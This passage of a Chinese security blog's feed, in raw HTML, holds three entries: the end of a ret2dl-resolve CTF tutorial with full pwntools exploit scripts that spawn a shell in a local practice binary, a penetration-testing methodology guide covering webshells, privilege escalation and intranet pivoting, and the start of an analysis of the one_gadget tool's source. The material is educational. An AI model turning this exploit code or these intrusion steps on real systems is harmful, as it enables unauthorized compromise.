class="line">st_name, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span></span><br><span class="line">])</span><br><span class="line">payload = flat([</span><br><span class="line">plt_0,</span><br><span class="line">index_offset,</span><br><span class="line"><span class="number">0xdeadbeef</span>,</span><br><span class="line"><span class="number">1</span>, buf + <span class="number">80</span>, len(cmd),</span><br><span class="line">fake_reloc,</span><br><span class="line"><span class="string">'A'</span> * align,</span><br><span class="line">fake_sym,</span><br><span class="line"><span class="string">'write\x00'</span></span><br><span class="line">])</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>, <span class="string">'A'</span>)</span><br><span class="line">payload += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload = payload.ljust(<span class="number">100</span>, <span class="string">'A'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>中间<code>stname</code>的位置因为<code>Elf32_Sym</code>的大小为<code>0x10</code>，所以要加<code>0x10</code>。结果成功：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">λ ./exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./bof'</span>: pid 9778</span><br><span class="line">[*] <span class="string">'/home/assassinq/Desktop/ret2dl-resolve/bof'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">/bin/sh[*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$</span><br></pre></td></tr></table></figure><h2 id="Step-Six"><a href="#Step-Six" class="headerlink" title="Step Six"></a>Step Six</h2><p>最后一步将<code>write</code>改成<code>system</code>，同时设置一下<code>system</code>的参数：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">'i386'</span></span><br><span class="line">p = process(<span class="string">'./bof'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./bof'</span>)</span><br><span class="line">g = <span class="keyword">lambda</span> x: next(elf.search(asm(x)))</span><br><span class="line">write_plt = elf.plt[<span class="string">'write'</span>]</span><br><span class="line">write_got = elf.got[<span class="string">'write'</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">'read'</span>]</span><br><span class="line">pop_ebp_ret = g(<span class="string">'pop ebp ; ret'</span>)</span><br><span class="line">leave_ret = g(<span class="string">'leave ; ret'</span>)</span><br><span class="line">bss = <span class="number">0x0804a040</span> <span class="comment"># readelf -S ./bof | grep ".bss"</span></span><br><span class="line">buf = bss + <span class="number">0x800</span></span><br><span class="line">pop_pop_pop_ret = <span class="number">0x08048629</span> <span class="comment"># ROPgadget --binary ./bof --only "pop|ret"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input('@')</span></span><br><span class="line">offset = <span class="number">112</span></span><br><span class="line">p.recvuntil(<span class="string">'Return to dl_runtime_resolve!'</span>)</span><br><span class="line">payload = flat([</span><br><span class="line"><span class="string">'A'</span> * offset,</span><br><span class="line">read_plt,</span><br><span class="line">pop_pop_pop_ret,</span><br><span class="line"><span class="number">0</span>, buf, <span class="number">100</span>,</span><br><span class="line">pop_ebp_ret,</span><br><span class="line">buf - <span class="number">4</span>,</span><br><span class="line">leave_ret</span><br><span class="line">])</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># raw_input('@')</span></span><br><span class="line">cmd = <span class="string">'/bin/sh'</span></span><br><span class="line">plt_0 = <span class="number">0x08048380</span> <span class="comment"># objdump -d -j .plt ./bof</span></span><br><span class="line">rel_plt = <span class="number">0x8048330</span> <span class="comment"># objdump -s -j .rel.plt ./bof</span></span><br><span class="line">index_offset = (buf + <span class="number">24</span>)- rel_plt</span><br><span class="line">dynsym = <span class="number">0x080481d8</span> <span class="comment"># readelf -S ./bof | grep ".dynsym"</span></span><br><span class="line">dynstr = <span class="number">0x08048278</span> <span class="comment"># readelf -S ./bof | grep ".dynstr"</span></span><br><span class="line">fake_sym_addr = buf + <span class="number">32</span></span><br><span class="line">align = <span class="number">0x10</span> - ((fake_sym_addr - dynsym) &amp; <span class="number">0xf</span>)</span><br><span class="line">fake_sym_addr += align</span><br><span class="line">index_dynsym = (fake_sym_addr - dynsym) / <span class="number">0x10</span></span><br><span class="line">r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">st_name = (fake_sym_addr + <span class="number">0x10</span>) - dynstr</span><br><span class="line">fake_sym = flat([</span><br><span class="line">st_name, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x12</span></span><br><span class="line">])</span><br><span class="line">payload = flat([</span><br><span class="line">plt_0,</span><br><span class="line">index_offset,</span><br><span class="line"><span class="number">0xdeadbeef</span>,</span><br><span class="line">buf + <span class="number">80</span>,</span><br><span class="line"><span class="number">0xdeadbeef</span>,</span><br><span class="line"><span class="number">0xdeadbeef</span>,</span><br><span class="line">fake_reloc,</span><br><span class="line"><span class="string">'A'</span> * align,</span><br><span class="line">fake_sym,</span><br><span class="line"><span class="string">'system\x00'</span></span><br><span class="line">])</span><br><span class="line">payload = payload.ljust(<span class="number">80</span>, <span class="string">'A'</span>)</span><br><span class="line">payload += cmd + <span class="string">'\x00'</span></span><br><span class="line">payload = payload.ljust(<span class="number">100</span>, <span class="string">'A'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>成功 Get Shell：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">λ ./exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">'./bof'</span>: pid 9948</span><br><span class="line">[*] <span class="string">'/home/assassinq/Desktop/ret2dl-resolve/bof'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">$ ls</span><br><span class="line">bof  bof.c  core  exp.py  Makefile  peda-session-bof.txt</span><br><span class="line">$ id</span><br><span class="line">uid=1000(assassinq) gid=1000(assassinq) groups=1000(assassinq),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),129(docker)</span><br></pre></td></tr></table></figure><h1 id="Complement-64-bit"><a href="#Complement-64-bit" class="headerlink" title="Complement: 64 bit"></a>Complement: 64 bit</h1><p>64 位下的利用相较于 32 位下有一些不同，像是一些结构体发生变化，如<code>Elf64_Rela</code>，还有其他的都在<a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/" target="_blank" rel="noopener">这篇文章</a>中都详细地介绍了</p><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="http://pwn4.fun/2016/11/09/Return-to-dl-resolve/" target="_blank" rel="noopener">http://pwn4.fun/2016/11/09/Return-to-dl-resolve/</a><br><a href="http://www.inforsec.org/wp/?p=389" target="_blank" rel="noopener">http://www.inforsec.org/wp/?p=389</a><br><a href="http://drops.wooyun.org/binary/14360" target="_blank" rel="noopener">http://drops.wooyun.org/binary/14360</a><br><a href="http://rk700.github.io/2015/08/09/return-to-dl-resolve/" target="_blank" rel="noopener">http://rk700.github.io/2015/08/09/return-to-dl-resolve/</a><br><a href="http://phrack.org/issues/58/4.html#article" target="_blank" rel="noopener">http://phrack.org/issues/58/4.html#article</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;一步步了解&lt;code&gt;dl-resolve&lt;/code&gt;的利用方法。&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
      <category term="pwn" scheme="https://qianfei11.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>渗透测试基础指南</title>
    <link href="https://qianfei11.github.io/2019/08/04/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%9F%BA%E7%A1%80%E6%8C%87%E5%8D%97/"/>
    <id>https://qianfei11.github.io/2019/08/04/渗透测试基础指南/</id>
    <published>2019-08-04T08:17:53.000Z</published>
    <updated>2019-08-26T05:55:08.042Z</updated>
    
    <content type="html"><![CDATA[<p>记录一下渗透测试的基础步骤。</p><a id="more"></a><h1 id="Penetration-test"><a href="#Penetration-test" class="headerlink" title="Penetration test"></a>Penetration test</h1><p>渗透测试即利用我们所掌握的渗透知识，对网站进行一步一步的渗透，发现其中存在的漏洞和隐藏的风险，然后撰写一篇测试报告，提供给客户。客户根据我们撰写的测试报告，对网站进行漏洞修补，以防止黑客的入侵。</p><p>渗透测试的前提是经过用户的授权，才可以对网站进行渗透。如果我们没有经过客户的授权而对一个网站进行渗透测试的话是违法的。2016 年 6 月 1 日，我国颁布了<a href="https://baike.baidu.com/item/%E4%B8%AD%E5%8D%8E%E4%BA%BA%E6%B0%91%E5%85%B1%E5%92%8C%E5%9B%BD%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E6%B3%95" target="_blank" rel="noopener">《中华人民共和国网络安全法》</a>，对网络犯罪有了法律约束。</p><p>渗透测试分为白盒测试和黑盒测试：</p><ul><li>白盒测试：在知道目标网站源码和其他一些信息的情况下对其进行渗透，有点类似于代码审计</li><li>黑盒测试：只告诉我们这个网站的 url，其他什么都不告诉，模拟黑客对网站的渗透</li></ul><p>接下来记录一下黑盒测试的几个步骤</p><h2 id="Information-Gathering（信息收集）"><a href="#Information-Gathering（信息收集）" class="headerlink" title="Information Gathering（信息收集）"></a>Information Gathering（<a href="https://blog.csdn.net/qq_36119192/article/details/84027438" target="_blank" rel="noopener">信息收集</a>）</h2><ol><li>主动信息收集：通过直接访问、扫描网站，这种流量将流经网站</li><li>被动信息收集：利用第三方的服务对目标进行访问了解，比例：Google 搜索、Shodan 搜索等</li></ol><ul><li>DNS 域名信息的收集</li><li>整站分析<ul><li>服务器类型(Linux/Windows)</li><li>网站容器(Apache/Nginx/Tomcat/IIS)</li><li>脚本类型(php/jsp/asp/aspx)</li><li>数据库类型(Mysql/Oracle/Accees/Mqlserver)</li></ul></li><li>主机扫描(Nessus)</li><li>端口扫描(nmap)</li><li>网站敏感目录和文件</li><li>旁站和 C 段扫描</li><li>网站漏洞扫描</li></ul><h2 id="Vulnerability-Detection（漏洞探测）"><a href="#Vulnerability-Detection（漏洞探测）" class="headerlink" title="Vulnerability Detection（漏洞探测）"></a>Vulnerability Detection（漏洞探测）</h2><p>探测网站是否存在一些常见的 Web 漏洞：</p><ol><li>SQL 注入</li><li>XSS 跨站脚本</li><li>CSRF 跨站请求伪造</li><li>XXE 漏洞</li><li>SSRF 服务端请求伪造漏洞</li><li>文件包含漏洞</li><li>文件上传漏洞</li><li>文件解析漏洞</li><li>远程代码执行漏洞</li><li>CORS 跨域资源共享漏洞</li><li>越权访问漏洞</li><li>目录浏览漏洞和任意文件读取/下载漏洞</li><li>struts2 漏洞</li><li>JAVA 反序列化漏洞</li><li>…</li></ol><h2 id="Vulnerability-Exploitation（漏洞利用）"><a href="#Vulnerability-Exploitation（漏洞利用）" class="headerlink" title="Vulnerability Exploitation（漏洞利用）"></a>Vulnerability Exploitation（漏洞利用）</h2><p>当我们探测到了该网站存在漏洞之后，我们就要对该漏洞进行利用了。不同的漏洞有不同的利用工具，很多时候，通过一个漏洞我们很难拿到网站的 webshell，我们往往需要结合几个漏洞来拿 webshell。</p><ol><li>SQL 注入：<a href="https://blog.csdn.net/qq_36119192/article/details/84479207" target="_blank" rel="noopener">Sqlmap</a></li><li>XSS 跨站脚本：<a href="https://blog.csdn.net/qq_36119192/article/details/82731839" target="_blank" rel="noopener">BeEF</a></li><li>抓包改包工具：<a href="https://blog.csdn.net/qq_36119192/article/details/84310858" target="_blank" rel="noopener">Burpsuite</a>、<a href="https://blog.csdn.net/qq_36119192/article/details/82942574" target="_blank" rel="noopener">Fidder</a></li><li>文件上传漏洞：<a href="https://blog.csdn.net/qq_36119192/article/details/84563791" target="_blank" rel="noopener">上传一句话木马，进而获得 webshell</a></li><li>提权：获得了 webshell 后，一般权限很低，所以需要提权，可以选择反弹一个 MSF 类型的 shell 提权，也可以使用其他提权（<a href="https://blog.csdn.net/qq_36119192/article/details/84887874" target="_blank" rel="noopener">Windows 提权</a>、<a href="https://blog.csdn.net/qq_36119192/article/details/84872644" target="_blank" rel="noopener">Linux 下用 SUID 提权</a>）</li></ol><h2 id="Intranet-forwarding（内网转发）"><a href="#Intranet-forwarding（内网转发）" class="headerlink" title="Intranet forwarding（内网转发）"></a>Intranet forwarding（<a href="https://blog.csdn.net/qq_36119192/article/details/84568266" target="_blank" rel="noopener">内网转发</a>）</h2><p>当我们获取到了网站的 Webshell 之后，如果我们是想获取该主机的有关信息，我们可以将该主机的 webshell 换成 MSF 的 shell。直接生成一个木马，然后在菜刀中执行该木马，我们就能接收到一个 MSF 类型的 shell。</p><p>如果我们还想进一步的探测内网主机的信息的话，我们就需要进行内网转发。我们不能直接和内网的主机通信，所以就需要借助获取到的 webshell 网站的服务器和内网主机进行通信。</p><h2 id="Intranet-Penetration（内网渗透）"><a href="#Intranet-Penetration（内网渗透）" class="headerlink" title="Intranet Penetration（内网渗透）"></a>Intranet Penetration（<a href="https://www.freebuf.com/company-information/172630.html" target="_blank" rel="noopener">内网渗透</a>）</h2><p>当能跟内网主机进行通信后，就可以开始进行内网渗透。可以先使用<a href="https://blog.csdn.net/qq_36119192/article/details/82079150" target="_blank" rel="noopener">nmap</a>对内网主机进行扫描，探测在线的主机，并且探测其使用的操作系统、开放的端口等信息。</p><p>内网用户基本都是使用的 windows 系统，而且大多数是使用的 windows7，在 windows7 中有很多漏洞，比如 MS17_010 这种漏洞，我们可以使用<a href="https://blog.csdn.net/qq_36119192/article/details/83215257" target="_blank" rel="noopener">Metasploit Framework</a>探测其 windows 系统是否存在这种漏洞，如果有这种漏洞，直接拿 shell。</p><p>企业内网大多数是一个域环境，所以我们只需要找到域控服务器，并拿下其权限，就可以登录其他所有用户的主机。</p><p>当然，内网中也有可能存在供内网使用的内网服务器，我们可以进一步渗透拿下其权限。</p><h2 id="Report-Writing（撰写渗透测试报告）"><a href="#Report-Writing（撰写渗透测试报告）" class="headerlink" title="Report Writing（撰写渗透测试报告）"></a>Report Writing（撰写渗透测试报告）</h2><p>完成渗透测试之后，需要对这次渗透测试撰写渗透测试报告。明确地写出哪里存在漏洞，以及漏洞修补的方法，以便于网站管理员根据渗透测试报告修补这些漏洞和风险，防止被黑客攻击。</p><h1 id="Complement"><a href="#Complement" class="headerlink" title="Complement"></a>Complement</h1><h2 id="IP-配置"><a href="#IP-配置" class="headerlink" title="IP 配置"></a>IP 配置</h2><h3 id="直接在文件中配置"><a href="#直接在文件中配置" class="headerlink" title="直接在文件中配置"></a>直接在文件中配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/network/interfaces</span><br><span class="line"><span class="comment"># auto eth0 # 自动启用第一块网卡</span></span><br><span class="line"><span class="comment"># ifconf eth0 inet static</span></span><br><span class="line"><span class="comment"># address 192.168.1.2 # IP地址</span></span><br><span class="line"><span class="comment"># netmask 255.255.255.0 # 子网掩码</span></span><br><span class="line"><span class="comment"># gateway 192.168.1.1 # 网关</span></span><br></pre></td></tr></table></figure><h3 id="命令行配置"><a href="#命令行配置" class="headerlink" title="命令行配置"></a>命令行配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo ifconfig ens33 192.168.10.163 netmask 255.255.255.0 <span class="comment"># 设置IP和掩码</span></span><br><span class="line">sudo route add default gw 192.168.10.1 <span class="comment"># 设置网关</span></span><br><span class="line">sudo <span class="built_in">echo</span> <span class="string">"nameserver 192.168.10.1"</span> &gt;&gt; /etc/resolv.conf <span class="comment"># 设置DNS</span></span><br><span class="line">sudo /etc/init.d/networking restart <span class="comment"># 重启服务</span></span><br></pre></td></tr></table></figure><h2 id="Common-Vulnerabilities"><a href="#Common-Vulnerabilities" class="headerlink" title="Common Vulnerabilities"></a>Common Vulnerabilities</h2><h3 id="输入输出验证不充分"><a href="#输入输出验证不充分" class="headerlink" title="输入输出验证不充分"></a>输入输出验证不充分</h3><ul><li>输入输出验证</li><li>SQL 注入</li><li>跨站脚本攻击（XSS）</li><li>跨站请求伪造（CSRF）</li><li>文件上传常见问题</li><li>文件下载漏洞</li></ul><h3 id="设计缺陷"><a href="#设计缺陷" class="headerlink" title="设计缺陷"></a>设计缺陷</h3><ul><li>非授权对象引用</li><li>纵向越权</li><li>找回密码漏洞</li></ul><h3 id="环境缺陷"><a href="#环境缺陷" class="headerlink" title="环境缺陷"></a>环境缺陷</h3><ul><li>解析漏洞<ul><li>IIS 5.x/6.0 解析漏洞</li><li>IIS 7.0/IIS 7.5/ Nginx &lt;8.03 畸形解析漏洞</li><li>Nginx &lt;8.03 空字节代码执行漏洞</li><li>Apache 解析漏洞</li><li>其他</li></ul></li></ul><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://blog.csdn.net/qq_36119192/article/details/84674109" target="_blank" rel="noopener">https://blog.csdn.net/qq_36119192/article/details/84674109</a><br><a href="https://blog.csdn.net/wsclinux/article/details/73177091" target="_blank" rel="noopener">https://blog.csdn.net/wsclinux/article/details/73177091</a><br><a href="http://blog.nsfocus.net/common-vulnerability-verify/" target="_blank" rel="noopener">http://blog.nsfocus.net/common-vulnerability-verify/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;记录一下渗透测试的基础步骤。&lt;/p&gt;
    
    </summary>
    
    
      <category term="web" scheme="https://qianfei11.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>one_gadget源码分析</title>
    <link href="https://qianfei11.github.io/2019/05/16/one-gadget%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
    <id>https://qianfei11.github.io/2019/05/16/one-gadget源码分析/</id>
    <published>2019-05-16T01:44:57.000Z</published>
    <updated>2019-08-26T05:52:16.792Z</updated>
    
    <content type="html"><![CDATA[<p>不清楚<code>one_gadget</code>具体原理是什么，打算看一下源码，做了一点草率的分析。</p><a id="more"></a><h1 id="Structure"><a href="#Structure" class="headerlink" title="Structure"></a>Structure</h1><p>目录结构大概是这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br></pre></td><td class="code"><pre><span class="line">$ tree</span><br><span class="line">.</span><br><span class="line">├── Gemfile</span><br><span class="line">├── Gemfile.lock</span><br><span class="line">├── LICENSE</span><br><span class="line">├── README.md</span><br><span class="line">├── README.tpl.md</span><br><span class="line">├── Rakefile</span><br><span class="line">├── appveyor.yml</span><br><span class="line">├── bin</span><br><span class="line">│   └── one_gadget</span><br><span class="line">├── builds_list</span><br><span class="line">├── examples</span><br><span class="line">│   ├── aarch64.png</span><br><span class="line">│   ├── from_build_id.png</span><br><span class="line">│   ├── i386.png</span><br><span class="line">│   ├── near.png</span><br><span class="line">│   ├── script.png</span><br><span class="line">│   └── x86_64.png</span><br><span class="line">├── lib</span><br><span class="line">│   ├── one_gadget</span><br><span class="line">│   │   ├── abi.rb</span><br><span class="line">│   │   ├── builds</span><br><span class="line">│   │   │   ├── libc-2.19-01e14462fc6097604edd54a2ee63664c65b2c12b.rb</span><br><span class="line">│   │   │   ├── ...</span><br><span class="line">│   │   │   ├── libc-2.19-fe76e177d397e9bdccf270232cc7e3a06e84aeb1.rb</span><br><span class="line">│   │   │   ├── libc-2.20-024df4febc9c789a8eeb052385d5e780b98a379f.rb</span><br><span class="line">│   │   │   ├── ...</span><br><span class="line">│   │   │   ├── libc-2.20-f53b8ad377a1988dcf6329bbdfa7b1201431656e.rb</span><br><span class="line">│   │   │   ├── libc-2.21-04f18629ef42b062ed0c8f60d5bfaa40a7d28ef7.rb</span><br><span class="line">│   │   │   ├── ...</span><br><span class="line">│   │   │   ├── libc-2.21-fe668be19c2dadb3cef5e6eafb6796acabf0b8f1.rb</span><br><span class="line">│   │   │   ├── libc-2.21.90-d8785e62882096798b9a47645c401e2db0c3da87.rb</span><br><span class="line">│   │   │   ├── libc-2.21.90-ec2edee6fe6141b914f74b6d3541e986c1995420.rb</span><br><span class="line">│   │   │   ├── libc-2.22-056b23405739592e947a92cb210791fbfe9d9938.rb</span><br><span class="line">│   │   │   ├── ...</span><br><span class="line">│   │   │   ├── libc-2.22-ff7fbdaaef014460825b4ef5848e86834aa3880c.rb</span><br><span class="line">│   │   │   ├── libc-2.23-012683a92d161c37d51d89711c4870ba30904c3d.rb</span><br><span class="line">│   │   │   ├── ...</span><br><span class="line">│   │   │   ├── libc-2.23-ffb3662a7bc5e136fa8f464fc14ec23efb8d1817.rb</span><br><span class="line">│   │   │   ├── libc-2.23.90-203feaf8a7e40cef8a75568a406a22fdeda94f8b.rb</span><br><span class="line">│   │   │   ├── ...</span><br><span class="line">│   │   │   ├── libc-2.23.90-f149edaf4dee34b38f831bf0914af2ecf0a1a317.rb</span><br><span class="line">│   │   │   ├── libc-2.24-024385baa7aaf9c62ae336e896bcf245dda0fc01.rb</span><br><span class="line">│   │   │   ├── ...</span><br><span class="line">│   │   │   ├── libc-2.24-fe976940471b3f683eeebb268f095b7ff1c898c1.rb</span><br><span class="line">│   │   │   ├── libc-2.25-58c735bc7b19b0aeb395cce70cf63bd62ac75e4a.rb</span><br><span class="line">│   │   │   ├── ...</span><br><span class="line">│   │   │   ├── libc-2.25-eae5038c2b9ae67d9eda345aa9fbe0a7185ab436.rb</span><br><span class="line">│   │   │   ├── libc-2.26-1c39b3b3faa2a2cbb0fa0b6845b29332562262d3.rb</span><br><span class="line">│   │   │   ├── ...</span><br><span class="line">│   │   │   ├── libc-2.26-fb587bc4429e7d1b0de31a3b9ee8ae78ee797eb0.rb</span><br><span class="line">│   │   │   ├── libc-2.27-0e188ec5f09c187a7a92784d4b97aa251b15a93c.rb</span><br><span class="line">│   │   │   ├── ...</span><br><span class="line">│   │   │   ├── libc-2.27-b417c0ba7cc5cf06d1d1bed6652cedb9253c60d0.rb</span><br><span class="line">│   │   │   ├── libc-2.28-44f5a3efb0e5733fa9d97e690cb36cd4c682bcdb.rb</span><br><span class="line">│   │   │   ├── ...</span><br><span class="line">│   │   │   └── libc-2.28-6ee9454b96efa9e343f9e8105f2fa4529265ea05.rb</span><br><span class="line">│   │   ├── cli.rb</span><br><span class="line">│   │   ├── emulators</span><br><span class="line">│   │   │   ├── aarch64.rb</span><br><span class="line">│   │   │   ├── amd64.rb</span><br><span class="line">│   │   │   ├── i386.rb</span><br><span class="line">│   │   │   ├── instruction.rb</span><br><span class="line">│   │   │   ├── lambda.rb</span><br><span class="line">│   │   │   ├── processor.rb</span><br><span class="line">│   │   │   └── x86.rb</span><br><span class="line">│   │   ├── error.rb</span><br><span class="line">│   │   ├── fetcher.rb</span><br><span class="line">│   │   ├── fetchers</span><br><span class="line">│   │   │   ├── aarch64.rb</span><br><span class="line">│   │   │   ├── amd64.rb</span><br><span class="line">│   │   │   ├── base.rb</span><br><span class="line">│   │   │   ├── i386.rb</span><br><span class="line">│   │   │   └── x86.rb</span><br><span class="line">│   │   ├── gadget.rb</span><br><span class="line">│   │   ├── helper.rb</span><br><span class="line">│   │   ├── logger.rb</span><br><span class="line">│   │   ├── one_gadget.rb</span><br><span class="line">│   │   ├── update.rb</span><br><span class="line">│   │   └── version.rb</span><br><span class="line">│   └── one_gadget.rb</span><br><span class="line">├── one_gadget.gemspec</span><br><span class="line">├── spec</span><br><span class="line">│   ├── bin_spec.rb</span><br><span class="line">│   ├── cli_spec.rb</span><br><span class="line">│   ├── data</span><br><span class="line">│   │   ├── aarch64-libc-2.23.so</span><br><span class="line">│   │   ├── aarch64-libc-2.24.so</span><br><span class="line">│   │   ├── aarch64-libc-2.27.so</span><br><span class="line">│   │   ├── filename$with+special&amp;keys</span><br><span class="line">│   │   ├── libc-2.19-cf699a15caae64f50311fc4655b86dc39a479789.so</span><br><span class="line">│   │   ├── libc-2.19-fd51b20e670e9a9f60dc3b06dc9761fb08c9358b.so</span><br><span class="line">│   │   ├── libc-2.23-60131540dadc6796cab33388349e6e4e68692053.so</span><br><span class="line">│   │   ├── libc-2.23-926eb99d49cab2e5622af38ab07395f5b32035e9.so</span><br><span class="line">│   │   ├── libc-2.24-8cba3297f538691eb1875be62986993c004f3f4d.so</span><br><span class="line">│   │   ├── libc-2.26-2104f3d4ad5cf68603afbe7ba1a17f5ac99c5988.so</span><br><span class="line">│   │ 